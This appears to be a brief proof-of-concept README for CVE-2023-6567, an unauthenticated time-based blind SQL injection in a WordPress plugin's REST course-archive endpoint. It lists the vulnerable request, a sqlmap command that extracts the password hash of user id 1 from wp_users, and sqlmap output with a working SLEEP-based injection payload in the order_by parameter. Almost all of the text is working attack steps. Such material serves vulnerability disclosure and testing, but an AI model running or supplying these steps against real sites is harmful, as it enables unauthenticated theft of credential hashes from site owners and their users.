# CVE-2023-6567-poc
Time-based SQLi

Description
The plugin does not properly sanitise and escape the order_by parameter before using it in a SQL statement, leading to a SQL injection exploitable by unauthenticated users

1. Vulnerable GET request:
https://vulnerablewordpress.com/wp-json/lp/v1/courses/archive-course?c_search=test&order_by=ID&order=DESC&limit=10&return_type=html

2. Save GET request
3. sqlmap -r ~/sqli.req -p order_by --technique=T --sql-query = 'select user_pass from wp_users where id = 1'
4. sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: https://VULNERABLEWORDPRESS/wp-json/lp/v1/courses/archive-course?c_search=test&order_by=ID AND (SELECT 7508 FROM (SELECT(SLEEP(5)))VVvd)&order=DESC&limit=10&return_type=html
